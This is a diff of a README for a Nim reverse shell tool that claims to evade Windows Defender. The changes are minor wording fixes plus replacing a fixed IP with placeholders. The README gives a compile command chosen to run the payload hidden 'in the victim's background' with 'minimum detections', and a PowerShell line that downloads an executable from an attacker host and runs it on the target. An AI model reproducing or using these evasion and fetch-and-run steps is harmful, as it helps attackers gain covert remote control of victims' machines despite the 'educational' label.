@@ -1,6 +1,6 @@
 # Nim Reverse Shell
 
-A simple reverse shell written in Nim that bypasses Windows Defender detection (see the "Tested Operating Systems" section below for more details). **This code is made for educational purposes only**.
+A simple reverse shell is written in Nim that bypasses Windows Defender detection (see the "Tested Operating Systems" section below for more details). **This code is made for educational purposes only**.
 
 
 ## Tested Operating Systems
@@ -25,7 +25,7 @@ apt install nim
 
 ## Compilation
 
-The code can be compiled in various ways using Nim. In this example, the code is compiled to EXE using MinGW and runs in the victim's background once executed (thanks to the "--app:gui" flag). I strongly recommend to follow the below example for minimum detections as possible.
+The code can be compiled in various ways using Nim. In this example, the code is compiled to EXE using MinGW and runs in the victim's background once executed (thanks to the "--app:gui" flag). I strongly recommend following the below example for minimum detections as possible.
 
 ```bash
 nim c -d:mingw --app:gui rev_shell.nim
@@ -34,5 +34,5 @@ nim c -d:mingw --app:gui rev_shell.nim
 ## On Windows(Target Machine)
 
 ```powershell
-Invoke-WebRequest -Uri http://192.168.1.71:81/rev_shell.exe -OutFile rev_shell.exe ; ./rev_shell.exe
+Invoke-WebRequest -Uri http://<ip_address>:<port>/rev_shell.exe -OutFile rev_shell.exe ; ./rev_shell.exe
 ```
